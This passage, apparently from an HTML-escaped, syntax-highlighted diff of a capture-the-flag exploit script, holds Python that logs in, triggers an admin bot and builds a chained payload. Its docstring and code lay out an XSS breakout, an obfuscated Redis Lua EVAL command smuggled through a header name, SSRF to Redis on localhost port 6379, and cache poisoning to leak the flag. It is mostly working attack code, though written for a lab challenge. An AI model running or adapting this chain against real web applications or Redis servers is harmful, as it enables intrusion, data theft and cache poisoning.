class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ok&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[-] Could not register user: &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status_code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;nf&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/login&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;submit&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ok&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[-] Could not retrieve jwt token. Something went wrong: &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status_code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;nf&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Set-Cookie&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;send_report&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;
+    Requests report. Fail = exit.
+    &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/api/report&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Cookie&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ok&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[-] Something went wrong sending report request: &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status_code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;nf&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_previous_searches&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;
+    Requests admin&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s previous searches. Fail = exit.
+    :return requests
+    &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;
+
+    &lt;span class=&quot;c1&quot;&gt;# Make sure we CACHE-MISS by adding random strings as parameters.
+&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/api/prev_searches?&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;choices&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ascii_letters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Cookie&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ok&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[-] Failed to retrieve previous searches: &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status_code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;nf&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;searches&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;generate_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;query_search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;
+    Generates a multi-stage XSS and SSRF payload that executes inside the admin bot&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s browser context.
+    
+    The payload performs the following steps:
+    1. Breaks out of the unescaped HTML input context using a closing sequence (&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;).
+    2. Dynamically builds a raw Redis inline command string (&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;eval &amp;lt;lua_script&amp;gt; 0 dummy&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;) where the 
+       entire Lua script is obfuscated into raw byte points via Lua&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;string.char(...)&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;. This completely 
+       bypasses the RESP inline parser&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s restrictions on literal string quotes and internal spaces, 
+       preventing protocol syntax errors when parsed by Redis.
+    3. Exploits a parameter-smuggling behavior in the internal `/panel` endpoint. By passing the 
+       constructed Redis command string as a POST argument key with an empty value, the Tornado backend 
+       loops through the arguments and injects this entire string verbatim as a custom HTTP header name.
+    4. Fires an SSRF request via Tornado&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s HTTP client directly at the loopback Redis instance (port 6379). 
+       Since the smuggled string is written directly into the raw TCP network stream as a header name, 
+       Redis processes the line as an inline RESP command.
+    5. The executed Lua script calls &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;get FLAG&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; inside the internal database, wraps the recovered flag 
+       string into a structured JSON dictionary (including a fake status_code=200 and body), and writes 
+       it back into Redis using &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; at the exact cache key hash assigned to the current search URL.
+    6. This directly poisons the front-end CDN layer with a counterfeit cache entry containing the flag, 
+       allowing a low-privileged external user to easily exfiltrate the flag by querying the matching 
+       search page from the proxy.
+    &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/search?query=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;quote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;query_search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;url_hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hashlib&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;sha256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;hexdigest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;transform&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;string.char(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;character&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;character&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;
+
+
+    &lt;span class=&quot;n&quot;&gt;lua_script&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;`return(redis.call(%s,%s,cjson.encode({body=redis.call(%s,%s),status_code=200})))`&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;transform&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;transform&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url_hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;transform&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;transform&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;FLAG&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;gt;&amp;lt;script&amp;gt;
+        (async () =&amp;gt; {
+            await fetch(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/search?query=XSS_LEBT_&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; + Date.now());
+            const luaScript = %s;
+            const separator = String.fromCharCode(32);
+            const smuggledPayload = &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; + separator + luaScript + separator + &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; + separator + &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;dummy&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;;
+            const payloadArgs = new URLSearchParams();
+            payloadArgs.append(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;, &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;http://127.0.0.1:6379/&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;);
